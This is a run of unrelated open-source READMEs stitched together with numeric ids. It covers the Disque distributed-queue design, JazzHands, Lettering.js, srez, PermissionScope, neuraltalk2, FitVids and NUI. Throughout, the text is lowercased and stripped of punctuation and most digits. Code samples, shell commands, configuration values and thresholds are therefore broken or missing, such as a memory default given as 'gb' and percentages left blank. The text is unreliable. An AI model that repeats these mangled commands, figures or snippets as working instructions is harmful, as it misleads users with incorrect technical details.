the event of nodes failing is not handled in any special way cluster messages nodes communicate via a set of messages using the node to node message bus a few of the messages are used in order to check that other nodes are reachable and to mark nodes as failing those messages are ping pong and fail since failure detection is only used to adjust the replication strategy talk with reachable nodes first in order to improve latency  the details are yet not described other messages are more important since they are used in order to replicate jobs re issue jobs while trying to minimize multiple deliveries and in order to auto federate to serve consumers when messages are produced in different nodes compared to where consumers are the following is a list of messages and what they do split by category note that this is just an informal description while in the next sections describing the disque state machine there is a more detailed description of the behavior caused by message reception and in what cases they are generated cluster messages related to jobs replication and queueing repljob ask the receiver to replicate a job that is to add a copy of the job among the registered jobs in the target node when a job is accepted the receiver replies with gotjob to the sender a job may not be accepted if the receiving node is near out of memory in this case gotjob is not sent and the message discarded gotjob the reply to repljob to confirm the job was replicated enqueue ask a node to put a given job into its queue this message is used when a job is created by a node that does not want to take a copy so it asks another node among the ones that acknowledged the job replication to queue it for the first time if this message is lost after the retry time some node will try to re queue the message unless retry is set to zero willqueue this message is sent  milliseconds before a job is re queued to all the nodes that may have a copy of the message according to the sender table if some of the receivers already have the job queued they ll reply with queued in order to prevent the sender to queue the job again avoid multiple delivery when possible queued when a node re queues a job it sends queued to all the nodes that may have a copy of the message so that the other nodes will update the time at which they ll retry to queue the job moreover every node that already has the same job in queue but with a node id which is lexicographically smaller than the sending node will de queue the message in order to best effort de dup messages that may be queued in multiple nodes at the same time cluster messages related to ack propagation and garbage collection setack this message is sent to force a node to mark a job as successfully delivered acknowledged by the worker the job will no longer be considered active and will never be re queued by the receiving node also setack is send to the sender if the receiver of queued or willqueue message has the same job marked as acknowledged successfully delivered already gotack this message is sent in order to acknowledge a setack message the receiver can mark a given node that may have a copy of a job as informed about the fact that the job was acknowledged by the worker nodes delete garbage collect a message cluster wide when they believe all the nodes that may have a copy are informed about the fact the job was acknowledged deljob ask the receiver to remove a job is only sent in order to perform garbage collection of jobs by nodes that are sure the job was already delivered correctly usually the node sending deljob only does that when its sure that all the nodes that may have a copy of the message already marked the message ad delivered however after some time the job gc may be performed anyway in order to reclaim memory and in that case an otherwise avoidable multiple delivery of a job may happen the deljob message is also used in order to implement fast acknowledges cluster messages related to nodes federation needjobs queuecount the sender asks the receiver to obtain messages for a given queue possibly count messages but this is only an hit for congestion control and messages optimization the receiver is free to reply with whatever number of messages needjobs messages are delivered in two ways broadcasted to every node in the cluster from time to time in order to discover new source nodes for a given queue or more often to a set of nodes that recently replies with jobs for a given queue this latter mechanism is called an ad hoc delivery and is possible since every node remembers for some time the set of nodes that were recent providers of messages for a given queue in both cases needjobs messages are delivered with exponential delays with the exception of queues that drop to zero messages and have a positive recent import rate in this case an ad hoc needjobs delivery is performed regardless of the last time the message was delivered in order to allow a continuous stream of messages under load yourjobs array of messages the reply to needjobs an array of serialized jobs usually all about the same queue but future optimization may allow to send different jobs from different queues jobs into yourjobs replies are extracted from the local queue and queued at the receiver node s queue with the same name so even messages with a retry set to  at most once delivery still guarantee the safety rule since a given message may be in the source node on the wire or already received in the destination node if a yourjobs message is lost at least once delivery jobs will be re queued later when the retry time is reached disque state machine this section shows the most interesting as in less obvious parts of the state machine each disque node implements while practically it is a single state machine it is split in sections the state machine description uses a convention that is not standard but should look familiar since it is event driven made of actions performed upon message receptions in the form of commands received from clients messages received from other cluster nodes timers and procedure calls note that job is a job object with the following fields  job delivered a list of nodes that may have this message this list does not need to be complete is used for best effort algorithms  job confirmed a list of nodes that confirmed reception of ack by replying with a gotjob message  job id the job  chars id  job state the job state among wait repl  active  queued  acked  job replicate replication factor for this job  job qtime time at which we need to re queue the job list fields such as delivered and confirmed support methods like size to get the number of elements states are as follows  wait repl the job is waiting to be synchronously replicated  active the job is active either it reached the replication factor in the originating node or it was created because the node received an repljob message from another node  queued the job is active and also is pending into a queue in this node  acked the job is no longer active since a client confirmed the reception using the ackjob command or another disque node sent a setack message for the job generic functions procedure lookup job string job id  if job with the specified id is found returns the corresponding job object  otherwise returns null procedure unregister object job  delete the job from memory and if queued from the queue procedure enqueue job  if job state queued return asap  add job into job queue  change job state to queued procedure dequeue job  if job state queued return asap  remove job from job queue  change job state to active on recv cluster message deljob string job id  job call lookup job job id  if job null then call unregister job job replication state machine this part of the state machine documents how clients add jobs to the cluster and how the cluster replicates jobs across different disque nodes on recv client command addjob string queue name string body integer replicate integer retry integer ttl  create a job object in wait repl state having as body ttl retry queue name the specified values  send repljob job serialized cluster message to replicate  nodes  block the client without replying step  we ll reply to the client in step  of gotjob message processing on recv cluster message repljob object serialized job  job call lookup job serialized job id  if job null then job delivered union job deliveredserialized job delivered return asap since we have the job  create a job from serialized job information  job state active  reply to the sender with gotjob job id step  we may already have the job since repljob may be duplicated step  if we already have the same job we update the list of jobs that may have a copy of this job performing the union of the list of nodes we have with the list of nodes in the serialized job on recv cluster message gotjob object serialized job  job call lookup job serialized job id  if job null or job state wait repl return asap  add sender node to job confirmed  if job confirmed size job replicate then change job state to active  call enqueue job  and reply to the blocked client with job id step  as we receive enough confirmations via gotjob messages we finally reach the replication factor required by the user and consider the message active timer firing every next  milliseconds while a job still did not reached the expected replication factor  select an additional node not already listed in job delivered  call it node  add node to job delivered  send repljob job serialized cluster message to each node in job delivered step  we send the message to every node again so that each node will have a chance to update job delivered with the new nodes it is not required for each node to know the full list of nodes that may have a copy but doing so improves our approximation of single delivery whenever possible job re queueing state machine this part of the state machine documents how disque nodes put a given job back into the queue after the specified retry time elapsed without the job being acknowledged timer firing  milliseconds before the retry time elapses  send willqueue job id to every node in jobs delivered timer firing when job qtime time is reached  if job retry  then return asap  call enqueue job  update job qtime to now and job retry  send queued job id message to each node in job delivered step  at most once jobs never get enqueued again step  we ll retry again after the retry period on recv cluster message willqueue string job id  job call lookup job job id  if job null then return asap  if job state queued send queued job id to job delivered  if job state acked send setack job id to the sender step  we broadcast the message since likely the other nodes are going to retry as well step  setack processing is documented below in the acknowledges section of the state machine description on recv cluster message queued string job id  job call lookup job job id  if job null then return asap  if job state acked then return asap  if job state queued then if sender node id is greater than my node id call dequeue job  update job qtime setting it to now and job retry step  if multiple nodes re queue the job about at the same time because of race conditions or network partitions that make willqueue not effective then queued forces receiving nodes to dequeue the message if the sender has a greater node id lowering the probability of unwanted multiple delivery step  now the message is already queued somewhere else but the node will retry again after the retry time acknowledged jobs garbage collection state machine this part of the state machine is used in order to garbage collect acknowledged jobs when a job finally gets acknowledged by a client procedure ack job job  if job state is already acked  do nothing and return asap  change job state to acked  dequeue the job if queued schedule first call to timer procedure start gc job  send setack job delivered size to each node that is listed in job delivered but is not listed in job confirmed  if job delivered size   then send setack  to every node in the cluster step  this is an ack about a job we don t know in that case we can just broadcast the acknowledged hoping somebody knows about the job and replies on recv client command ackjob string job id  job call lookup job job id  if job is null  ignore the message and return  call ack job job  call start gc job on recv cluster message setack string job id integer may have  job call lookup job job id  call ack job job if job is not null  reply with gotack if job null or job delivered size may have  if job null and jobs delivered size may have then call start gc job  if may have  and job null  reply with gotack  and call start gc job steps  and  makes sure that among the reachable nodes that may have a message garbage collection will be performed by the node that is aware of more nodes that may have a copy step  instead is used in order to start a gc attempt if we received a setack message from a node just hacking a dummy ack an acknowledge about a job it was not aware of on recv cluster message gotack string job id bool known  job call lookup job job id return asap if job null  call ack job job  if known true and job delivered size  then add the sender node to job delivered  if known true or known false and job delivered size  or known false and sender is an element of job delivered then add the sender node to jobs confirmed  if job delivered size  and job delivered size job confirmed size  then send deljob job id to every node in the job delivered list and call unregister job  if job delivered  and known true  then call unregister job  if job delivered  and job confirmed size cluster size then call unregister job step  if job delivered size is zero it means that the node just holds a dummy ack for the job it means the node has an acknowledged job it created on the fly because a client acknowledged via ackjob command a job it was not aware of step  we don t have to hold a dummy acknowledged jobs if there are nodes that have the job already acknowledged step  this happens when nobody knows about a job like when a client acknowledged a wrong job id timer from time to time exponential backoff with random error  for every acknowledged job in memory  call start gc job limitations disque is new code not tested and will require quite some time to reach production quality it is likely very buggy and may contain wrong assumptions or tradeoffs as long as the software is non stable the api may change in random ways without prior notification it is possible that disque spends too much effort in approximating single delivery during failures the fast acknowledge concept and command makes the user able to opt out this efforts but yet i may change the disque implementation and internals in the future if i see the user base really not caring about multiple deliveries during partitions there is yet a lot of redis dead code inside probably that could be removed disque was designed a bit in astronaut mode  not triggered by an actual use case of mine but more in response to what i was seeing people doing with redis as a message queue and with other message queues however i m not an expert if i succeeded to ship something useful for most users this is kinda of an accomplishment otherwise it may just be that disque is pretty useless as redis disque is single threaded while in redis there are stronger reasons to do so in disque there is no manipulation of complex data structures so maybe in the future it should be moved into a threaded server we need to see what happens in real use cases in order to understand if it s worth it or not the number of jobs in a disque process is limited to the amount of memory available again while this in redis makes sense imho  in disque there are definitely simple ways in order to circumvent this limitation like logging messages on disk when the server is out of memory and consuming back the messages when memory pressure is already acceptable however in general like in redis manipulating data structures in memory is a big advantage from the point of view of the implementation simplicity and the functionality we can provide to users disque is completely not optimized for speed was never profiled so far i m currently not aware of the fact it s slow fast or average compared to other messaging solutions for sure it is not going to have redis alike numbers because it does a lot more work at each command for example when a job is added it is serialized and transmitted to other n servers there is a lot more message passing between nodes involved and so forth the good news is that being totally unoptimized there is room for improvements ability of federation to handle well low and high loads without incurring into congestion or high latency was not tested well enough the algorithm is reasonable but may fail short under many load patterns amount of tested code path and possible states is not enough is disque part of redis no it is a standalone project however a big part of the redis networking source code nodes message bus libraries and the client protocol were reused in this new project in theory it was possible to extract the common code and release it as a framework to write distributed systems in c however this is not a perfect solution as well since the projects are expected to diverge more and more in the future and to rely on a common foundation was hard moreover the initial effort to turn redis into two different layers an abstract server networking stack and cluster bus and the actual redis implementation was a huge effort ways bigger than writing disque itself however while it is a separated project conceptually disque is related to redis since it tries to solve a redis use case in a vertical ad hoc way who created disque disque is a side project of salvatore sanfilippo aka antirez there are chances for this project to be actively developed currently i consider this just a public alpha if i see people happy to use it for the right reasons i e it is better in some use cases compared to other message queues i ll continue the development otherwise it was anyway cool to develop it i had much fun and i definitely learned new things what happens when a node runs out of memory  maxmemory setting is mandatory in disque and defaults to gb  when  of maxmemory is reached disque starts to replicate the new jobs only to external nodes without taking a local copy so basically if there is free ram into other nodes adding still works  when  of maxmemory is reached disque starts to evict data that does not violates the safety guarantees for instance acknowledged jobs and inactive queues  when  of maxmemory is reached commands that may result into more memory used are not processed at all and the client is informed with an error are there plans to add the ability to hold more jobs than the physical memory of a single node can handle yes in disque it should be relatively simple to use the disk when memory is not available since jobs are immutable and don t need to necessarily exist in memory at a given time there are multiple strategies available the current idea is that when an instance is out of memory jobs are stored into a log file instead of memory as more free memory is available in the instance on disk jobs are loaded however in order to implement this there is to observe strong evidence of its general usefulness for the user base when i consume and produce from different nodes sometimes there is a delay in order for the jobs to reach the consumer why disque routing is not static the cluster automatically tries to provide messages to nodes where consumers are attached when there is an high enough traffic even one message per second is enough nodes remember other nodes that recently were sources for jobs in a given queue so it is possible to aggressively send messages asking for more jobs every time there are consumers waiting for more messages and the local queue is empty however when the traffic is very low informations about recent sources of messages are discarded and nodes rely on a more generic mechanism in order to discover other nodes that may have messages in the queues we need them which is also used in high traffic conditions as well in order to discover new sources of messages for a given queue for example imagine a setup with two nodes a and b  a client attaches to node a and asks for jobs in the queue myqueue node a has no jobs enqueued so the client is blocked  after a few seconds another client produces messages into myqueue  but sending them to node b during step  if there was no recent traffic of imported messages for this queue node a has no idea about who may have messages for the queue myqueue every other node may have or none may have so it starts to broadcast needjobs messages to the whole cluster however we can t spam the cluster with messages so if no reply is received after the first broadcast the next will be sent with a larger delay and so foth the delay is exponential with a maximum value of  seconds this parameters will be configurable in the future likely when there is some traffic instead nodes send needjobs messages asap to other nodes that were recent sources of messages even when no reply is received the next needjobs messages will be sent more aggressively to the subset of nodes that had messages in the past with a delay that starts at  milliseconds and has a maximum value of two seconds in order to minimize the latency needjobs messages are not throttled at all when  a client consumed the last message from a given queue source nodes are informed immediately in order to receive messages before the node asks for more  blocked clients are served the last message available in the queue for more information please refer to the file queue c  especially the function needjobsforqueue and its callers are messages re enqueued in the queue tail or head or what messages are put into the queue according to their creation time attribute this means that they are enqueued in a best effort order in the local node queue messages that need to be put back into the queue again because their delivery failed are usually but not always older than messages already in queue so they ll likely be among the first to be delivered to workers what disque means distributed queue but is also a joke with dis as negation like in dis order of the strict concept of queue since disque is not able to guarantee the strict ordering you expect from something called queue and because of this tradeof it gains many other interesting things community how to get help and how to help get in touch with us in one of the following ways  join the disque irc channel at irc freenode net  create an issue or pull request if your question or issue is about the disque implementation itself i would like to say thank you to the following persons and companies pivotal for allowing me to work on disque most in my spare time but sometimes during work hours moreover pivotal agreed to leave the copyright of the code to me this is very generous thanks pivotal michel martens and damian janowski for providing early feedback about disque while the project was still private everybody who is already writing client libraries sending pull requests creating issues in order to move this forward from alpha to something actually usable

13200787, jazz hands and example and docs and jazzhandsbanner jpg jazz hands is a simple keyframe based animation framework for uikit animations can be controlled via gestures scroll views kvo or reactivecocoa jazz hands and example and docs and jazzhands demo gif open jazzhandsdemo xcworkspace to see a simple demonstration of moving scaling fading and transforming views in a scrolling app intro to run the example project clone the repo and run pod install from the example directory it simply add the following line to your podfile pod jazzhands you may alternatively just copy the contents of the jazzhands folder into your project first add jazzhands to your uiviewcontroller now create an animator to manage all of the animations in this uiviewcontroller property nonatomic strong iftttanimator animator and and later self animator iftttanimator new create an animation for a view that you want to animate there are multiple types of animation that can be applied to a view for this example we ll use iftttalphaanimation  which fades a view in and out iftttalphaanimation alphaanimation iftttalphaanimation animationwithview viewthatyouwanttoanimate register the animation with the animator self animator addanimation alphaanimation add some keyframes to the animation let s fade this view out between times  and  alphaanimation addkeyframefortime  alpha  f alphaanimation addkeyframefortime  alpha  f now to animate the view tell the animator what time it is for example to tie this animation to a uiscrollview notify the animator of time in the scroller s delegate method void scrollviewdidscroll uiscrollview scrollview super scrollviewdidscroll scrollview self animator animate scrollview contentoffset x this will produce an effect where the view will be fully faded in and visible for scroll positions  to  between scroll positions  and  the view will fade out to be invisible and it will stay faded out for scroll positions greater than  jazz hands supports several types of animations and iftttalphaanimation animates the alpha property  creates fade effects  and iftttrotationanimation animates a rotation transform in degrees  for rotation effects  and iftttbackgroundcoloranimation animates the backgroundcolor property and iftttcornerradiusanimation animates the layer cornerradius property and ifttthideanimation animates the hidden property  hides and shows views  and iftttscaleanimation applies a scaling transform  to scale view sizes  and ifttttranslationanimation applies a translation transform  to translate view position  and ifttttransformdanimation animates the layer transform property  for d transforms  and ifttttextcoloranimation animates the textcolor property of a uilabel and iftttfillcoloranimation animates the fillcolor property of a cashapelayer and iftttstrokestartanimation animates the strokestart property of a cashapelayer  does not work with iftttstrokeendanimation  and iftttstrokeendanimation animates the strokeend property of a cashapelayer  does not work with iftttstrokestartanimation  and iftttpathpositionanimation animates the layer position property of a uiview and iftttconstraintconstantanimation animates an autolayout constraint constant and iftttconstraintmultiplieranimation animates an autolayout constraint constant as a multiple of an attribute of another view  to offset or resize views based on another view s size  and iftttscrollviewpageconstraintanimation animates an autolayout constraint constant to place a view on a scroll view page  to position views on a scrollview using autolayout  and iftttframeanimation animates the frame property  moves and sizes views not compatible with autolayout  jazzhands s keepview onpage method of the iftttanimatedpagingscrollviewcontroller is a super easy way to lay out a paging scroll view that does what you expect it to when your app is rotated or used in the new split screen ipad views of ios a notoriously tricky aspect of getting your apps fully autolayout ready jazzhands sets up an autolayout friendly paging scroll view controller for you and all you need to do to make your layout respond properly to any view size changes is tell jazzhands which page you d like things on as a bonus because it s built on top of the animations library you can even tell jazzhands that you d like one of your views to show up on multiple pages while other views scroll past with a single call to keepview onpages to see the new jazzhands   autolayout magic in action check out the example project say you want to perform some animations based on a uitableview s scroll offset but you don t want to be the delegate for that table reactivecocoa is perfect for that racobserve self tableview contentoffset subscribenext nsvalue value cgfloat y self tableview contentoffset y self animator animate y or maybe you want to animate some views based upon the position of another view jazz hands works well with

904419, we developed a lightweight easy to use javascript span injector for radical web typography we re calling it lettering jay ess  and we re releasing it today for free over on github let me demo it for you and stevejobs we ll start with some really basic markup h class fancytitle some title and h document ready function   fancytitle lettering and script the resulting code will churn your fancytitle and output the following h class fancytitle span class char s and span span class char o and span span class char m and span span class char e and span span class char and span span class char t and span span class char i and span span class char t and span span class char l and span span class char e and span magical now the text is easy to manipulate in your css using an ordinal char pattern this plugin assumes basic counting skills but it s a pretty fast and easy way to get control over every letter there you have it but lettering js does even more lettering js has the ability to split words and lines as well if you want more information on how you can get radical with text read the lettering js wiki we ve found this to be a pretty quick and elegant solution to create typographical css posters it s also a great solution for really custom type headings while keeping the text selectable be smart and use sparingly you ll probably break your browser if you try to wrap every letter on your page in a span tag so don t do that look to use this in your headings blockquotes asides etc if you re going through the trouble to load a fancy font and that word or phrase is the largest on the site then it s important for it to be kerned well with lettering js kerning is a breeze you can simply use id of what i want to kern lettering and then on each char  you can set relative position or left and right margin works like a charm lettering js is now accessible by default it uses an aria label on the parent element and aria hidden on each of the children to prevent screenreaders from pausing while reading each individual characters or words we really want lettering js to be a quality helper for web typography if you have any feedback or suggestions please leave those over on the github we re excited about typography on the web and want to help make it print quality

66682814, image super resolution through deep learning this project uses deep learning to upscale x images by a x factor the resulting x images display sharp features that are plausible based on the dataset that was used to train the neural net here s an random non cherry picked example of what this network can do from left to right the first column is the x input image the second one is what you would get from a standard bicubic interpolation the third is the output generated by the neural net and on the right is the ground truth example output srezsampleoutput png as you can see the network is able to produce a very plausible reconstruction of the original face as the dataset is mainly composed of well illuminated faces looking straight ahead the reconstruction is poorer when the face is at an angle poorly illuminated or partially occluded by eyeglasses or hands this particular example was produced after training the network for  hours on a gtx  gpu equivalent to  batches or about  epochs in essence the architecture is a dcgan where the input to the generator network is the x image rather than a multinomial gaussian distribution in addition to that the loss function of the generator has a term that measures the l difference between the x input and downscaled version of the image produced by the generator the adversarial term of the loss function ensures the generator produces plausible faces while the l term ensures that those faces resemble the low res input data we have found that this l term greatly accelerates the convergence of the network during the first batches and also appears to prevent the generator from getting stuck in a poor local solution finally the generator network relies on resnet modules as we ve found them to train substantially faster than more old fashioned architectures the adversarial network is much simpler as the use of resnet modules did not provide an advantage during our experimentation after you have the required software above you will also need the large scale celebfaces attributes celeba dataset the model expects the align cropped images version extract all images to a subfolder named dataset i e srez and dataset and lotsoffiles jpg training with default settings python srezmain py run train the script will periodically output an example batch in png format onto the srez and train folder and checkpoint data will be stored in the srez and checkpoint folder after the network has trained you can also produce an animation showing the evolution of the output by running python srezmain py run demo

33456123, some examples of multiple permissions requests a single permission and the denied alert permissionscope gives you space to explain your reasons for requesting permissions and allows users to tackle the system dialogs at their own pace it presents a straightforward permissions design and is flexible enough to fit in to most uikit based apps best of all permissionscope detects when your app s permissions have been denied by a user and gives them an easy prompt to go into the system settings page to modify these permissions supported permissions notifications location whileinuse always contacts microphone reminders bluetooth permissionscope requires ios  and  compatible with both swift  and objective c based projects for swift  x support please use the swift branch or the    release version this branch was up to date on  and  and  but is not being maintained all future efforts will go towards swift  development github nickoneill and permissionscope   useframeworks pod permissionscope and import permissionscope in the files you d like to use it the simplest implementation displays a list of permissions and is removed when all of them have satisfactory access class viewcontroller uiviewcontroller let pscope permissionscope override func viewdidload super viewdidload and and set up permissions pscope addpermission contactspermission  message we use this to steal r nyour friends pscope addpermission notificationspermission notificationcategories nil  message we use this to send you r nspam and love notes pscope addpermission locationwhileinusepermission  message we use this to track r nwhere you live and and show dialog with callbacks pscope show finished results in print got results results  cancelled results void in print thing was cancelled  the permissions view will automatically show if there are permissions to approve and will take no action if permissions are already granted it will automatically hide when all permissions have been approved if you re attempting to block access to a screen in your app without permissions like say the broadcast screen in periscope  you should watch for the cancel closure and take an appropriate action for your app you can easily change the colors label and buttons fonts with permissionscope by modifying any of these properties field and type and comment and and headerlabel and uilabel and header uilabel with the message hey listen by default bodylabel and uilabel and header uilabel with the message we need a couple things r nbefore you get started by default closebuttontextcolor and

contentview and uiview and dialog s content view in addition the default behavior for tapping the background behind the dialog is to cancel the dialog which calls the cancel closure you can provide on show you can change this behavior with backgroundtapcancels during init permissionscope also has an abstracted api for getting the state for a given permission and requesting permissions if you need to do so outside of the normal dialog ui think of it as a unified ios permissions api that can provide some features that even apple does not such as detecting denied notification permissions switch permissionscope statuscontacts case unknown and and ask permissionscope requestcontacts case unauthorized disabled and and bummer return case authorized and and thanks return normally permissionscope is used to walk users through necessary permissions before they re allowed to do something in your app sometimes you may wish to instead call into the various request permissions seeking methods of permissionscope directly from your own ui to call these methods directly you must first set the viewcontrollerforalerts method to your current uiviewcontroller in case permissionscope needs to present some alerts to the user for denied or disabled permissions let pscope permissionscope pscope viewcontrollerforalerts self you will probably also want to set the onauthchange  oncancel  and ondisabledordenied closures which are called at the appropriate times when the request methods are finished otherwise you won t know when the work has been completed pscope onauthchange finished results in println request was finished with results results if results  status authorized println they ve authorized the use of notifications uiapplication sharedapplication registerforremotenotifications pscope oncancel results in println request was cancelled with results results pscope ondisabledordenied results in println request was denied or disabled with results results and then you might call it when the user toggles a switch ibaction func notificationschanged sender uiswitch if sender on and and turn on notifications if permissionscope statusnotifications authorized uiapplication sharedapplication registerforremotenotifications else pscope requestnotifications else and and turn off notifications if you re also using permissionscope in the traditional manner don t forget to set viewcontrollerforalerts back to it s default the instance of permissionscope the easiest way to do this is to set it explicitly before you call a request method and then reset it in your closures pscope viewcontrollerforalerts pscope as uiviewcontroller users will get the prompt to enable notifications when using permissionscope but it s up to you to watch for results in your app delegate s didregisterusernotificationsettings and then register for remote notifications independently this won t alert the user again you re still responsible for handling the shipment of user notification settings off to your push server you must set these info plist keys for location to work trickiest part of implementing location permissions you must implement the proper key in your info plist file with a short description of how your app uses location info shown in the system permissions dialog without this trying to get location permissions will just silently fail software use nslocationalwaysusagedescription or nslocationwheninuseusagedescription where appropriate for your app usage you can specify which of these location permissions you wish to request with locationalways or locationinuse while configuring permissionscope the nsbluetoothperipheralusagedescription key in the info plist specifying a short description of why your app needs to act as a bluetooth peripheral in the background is optional however enabling background modes in the capabilities section and checking the acts as a bluetooth le accessory checkbox is required solution tbd solution none works as intended by the os solution run your app without the debugger when using carthage  the following error occurs module file was created by an older version of the compiler

46531155, this is an early code release that works great but is slightly hastily released and probably requires some code reading of inline comments which i tried to be quite good with in general i will be improving it over time but wanted to push the code out there because i promised it to too many people cd and torch and install sh and enter yes at the end to modify your bashrc source and bashrc luarocks install nn luarocks install nngraph luarocks install image luarocks install cutorch luarocks install cunn luarocks install loadcaffe phew quite a few dependencies sorry no easy way around it in this case you want to run the evaluation script on a pretrained model checkpoint the eval script th eval lua model and path and to and model imagefolder and path and to and image and directory numimages  this tells the eval script to run up to  images from the given folder if you have a big gpu you can speed up the evaluation by increasing batchsize default  use numimages  to process all images the eval script will create an vis json file inside the vis folder which can then be visualized with the provided html interface python m simplehttpserver now visit localhost  in your browser and you should see your predicted captions beam search beam search is enabled by default because it increases the performance of the search for argmax decoding sequence however this is a little more expensive so if you d like to evaluate images faster but at a cost of performance use beamsize  for example in one of my experiments beam size  gives cider   and beam size  gives cider   running on mscoco images if you train on mscoco see how below  you will have generated preprocessed mscoco images which you can use directly in the eval script in this case simply leave out the imagefolder option and the eval script and instead pass in the inputh  inputjson to your preprocessed files this will make more sense once you read the section below great first we need to some preprocessing head over to the coco and folder and run the ipython notebook to download the dataset and do some very simple preprocessing the notebook will combine the train and val data together and create a very simple and small json file that contains a large list of image paths and raw captions for each image of the form filepath path and img jpg  captions a caption  a second caption of i tgit  once we have this we re ready to invoke the prepro py script which will read all of this in and create a dataset an hdf file and a json file ready for consumption in the lua code for example for ms coco we can run the prepro file as follows python prepro py inputjson coco and cocoraw json numval  numtest  imagesroot coco and images wordcountthreshold  outputjson coco and cocotalk json outputh coco and cocotalk h this is telling the script to read in all the data the images and the captions  allocate  images for val and test splits respectively and map all words that occur  times to a special unk token the resulting json and h files are about gb and contain everything we want to know about the dataset th train lua inputh coco and cocotalk h inputjson coco and cocotalk json the train script will take over and start dumping checkpoints into the folder specified by checkpointpath default current folder you also have to point the train script to the vggnet protos see the options inside train lua a few notes on training to give you an idea with the default settings one epoch of ms coco images is about  iterations  epoch of training with no finetuning notice this is the default takes about  hour and results in validation loss   and cider score of   by iteration  cider climbs up to about   validation loss at about   and then will top out at a bit below   cider after that additional improvements are only possible by turning on cnn finetuning i like to do the training in stages where i first train with no finetuning and then restart the train script with finetunecnnafter  to start finetuning right away and using startfrom flag to continue from the previous model checkpoint you ll see your score rise up to about   cider over  days or so on ms coco no problem create a json file in the exact same form as before describing your jpg files filepath path and img jpg  captions a caption  a similar caption  and invoke the prepro py script to preprocess all the images and data into and hdf file and json file then invoke train lua see detailed options inside code use the script convertcheckpointgputocpu lua to convert your gpu checkpoints to be usable on cpu see inline documentation for why this separate script is needed for example th convertcheckpointgputocpu lua gpucheckpoint t write the file gpucheckpoint tcpu t  which you can now run with gpuid  in the eval script bsd license i m also very grateful to the maintainers of torch for maintaining a wonderful deep learning library
2310615, a lightweight easy to use jquery plugin for fluid width video embeds include jquery   and and fitvids js in your layout and target your videos container with fitvids document ready function and and target your container wrapper post etc thing with videos fitvids and script this will wrap each video in a div fluid width video wrapper and apply the necessary css after the initial javascript call it s all percentage based css magic means native support for these may be deprecated if your video platform is not currently supported try adding it via a customselector have a custom video player we now have a customselector option where you can add your own specific video vendor selector mileage may vary depending on vendor and fluidity of player javascript and and selectors are comma separated just like css note  this will be the quickest way to add your own custom vendor as well as test your player s compatibility with fitvids have a video you want fitvids to ignore you can slap a class of fitvidsignore on your object or container and your video will be displayed as it is defined if you d like to add a custom block to ignore fitvids use the ignore option javascript thing with videos fitvids ignore mycooldiv myviiid and and selectors are comma separated just like css customers and clients will occasionally add a video to a general content area or article and this may be without a class or container that you re targetting a solution to this is to target the parent of videos using something like the below javascript iframe src youtube parent fitvids and and you can change the selector to suit potential video providers or chain them if your customer is likely to use more than one provider by targetting the iframe and embed parent you can then dynamically add in the fitvids special sauce on the fly without needing to know the container ahead of time vimeo autoplay api is not compatible with fitvids in ie you must manually wrap videos you want to autoplay

6859626, style ios apps with a stylesheet similar to css description  nui is a drop in ui kit for ios that lets you style ui elements using a stylesheet similar to css it lets you style an entire app in minutes out of the box the styling looks like this the styling is declared using a css like syntax that supports variables primaryfontname helveticaneue secondaryfontname helveticaneue light primaryfontcolor  primarybackgroundcolor eee background color primarybackgroundcolor border color aaa border width primaryborderwidth font color primaryfontcolor font color highlighted  font name primaryfontname font size  corner radius  navigationbar background tint color primarybackgroundcolor font name secondaryfontname font size  font color primaryfontcolor text shadow color  text shadow offset  nui lets you update the visual appearance of an entire application in minutes save themes for use in multiple applications set the styles of ui elements using simple rules like setting button border color cccccc define variables like primaryfontname or mybackgroundcolor a la sass and less avoid digging through documentation to find how to change specific ui elements styling quickly create custom style classes modify an application s styling while it is running some exciting features are on the horizon and contributions are very encouraged please see the faq how can i contribute installation  when installed as a framework nui can be natively imported in swift just add import nui to the top of your file if you choose not to use cocoapods you can install nui with these steps  copy the nui directory into your application  to use nui in swift add import nui and nuisettings h to your bridging header after dropping in nui you can modify your app s styling by simply editing nuistyle nss if you want to avoid modifying nui s files you can copy nuistyle nss into your app rename it e g mytheme nss  then replace nuisettings init with nuisettings initwithstylesheet mytheme step  in installation due to the nature of uikit s usage of simple ui components within more complex ui components nui doesn t style some uikit components in some very rare cases if you ever need to apply styling for these cases you can simply use nuirenderer objective c nuirenderer renderbutton mybutton this will use the button style you can also specify a custom class objective c nuirenderer renderbutton mybutton withclass largebutton n b nui used to require that you make your elements inherit from a nui class but this is no longer the case see migrating from subclasses to categories below for details nuistyle nss contains all of the style rules a rule like button font name helvetica modifies the font name of every uibutton for example the format should be self explanatory but here are some notes styling variables are defined at the top but they can be added and modified and removed as you see fit you can make an element inherit from multiple style classes see creating custom style classes below to see all of the available properties and values see the style classes and style value types lists below you can give elements custom style classes e g largebutton  and make those classes inherit from one or more other style classes by using the form button largebutton to bypass nui s styling for a particular element set the class to none you can set an element s style class either in interface builder or programmatically to do this you ll set a runtime attribute for the element in identity inspector user defined runtime attributes click and set the key path to nuiclass  type to string  and value to largebutton or button mybutton to do this you ll want to import the nui category for the element if you re styling a uibutton you d import objective c you can then set nuiclass on your element objective c mybutton nuiclass largebutton n b a style class can inherit from an indefinite number of style rules so if you want to create groups of style rules you can set nuiclass to something like mystylegroup mystylegroup mybutton if you want to prevent specific view classes from being styled e g third party ui elements that are already styled  you can specify these in nss exclude views uialertbutton exclude subviews uitableviewcelltdbadgedcelluitextfield exclude views will prevent nui from applying the button style to views of the specified classes exclude subviews will prevent nui from applying the button style to subviews of views of the specified classes if you want to globally prevent specific view classes from being styled regardless of style class  you can do this using and nuisettings setglobalexclusions objective c int main int argc char argv autoreleasepool nuisettings init nuisettings setglobalexclusions abmembercell  abmulticell return uiapplicationmain argc argv nil nsstringfromclass myappdelegate class you can have styles or variable definitions only be applied for a particular device and and or orientation by using a media query media device ipad and styles or definitions for ipad and media device iphone and styles or definitions for iphone and media orientation landscape and styles or definitions for landscape orientation and media orientation portrait and styles or definitions for portrait orientation and media orientation portrait and device ipad and styles or definitions for portrait orientation on ipad and objective c nuisettings setautoupdatepath and path and to and style nss now whenever you modify and save your nss file while the app is running the new changes will be applied instantaneously without any need to rebuild the app this can drastically speed up the process of styling you ll want to remove this line when you create a release build because all of the style rules are contained in nuistyle nss it s easy to create an nui theme that can be reused in other projects if you make one you like let me know and i ll likely be very happy to include it in this repo version   of nui required that you manually make your app s ui components inherit from nui classes e g nuibutton nui no longer requires this as it uses uikit categories instead subclasses if you were previously using nui   and update to a newer version of nui you ll want to simply unset those custom classes so that for example a uibutton is simply a uibutton instead of being a nuibutton this would be done either in identity inspector custom class or in the application code style classes  below are all of the currently available style classes their corresponding ui component classes and the

